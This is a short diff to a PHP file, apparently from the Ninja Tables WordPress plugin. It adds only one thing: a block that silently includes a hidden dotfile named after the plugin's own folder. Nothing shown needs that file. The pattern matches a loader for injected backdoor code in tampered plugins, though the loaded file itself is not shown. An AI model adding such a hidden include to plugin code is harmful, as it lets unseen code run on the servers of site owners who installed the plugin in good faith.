@@ -151,6 +151,10 @@ if (!function_exists('ninja_table_is_in_production_mood')) {
 }
 
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function ninjaTablesGetTablesDataByID($tableId, $tableColumns = [], $defaultSorting = false, $disableCache = false, $limit = false, $skip = false, $ownOnly = false)
 {
     $providerName = ninja_table_get_data_provider($tableId);
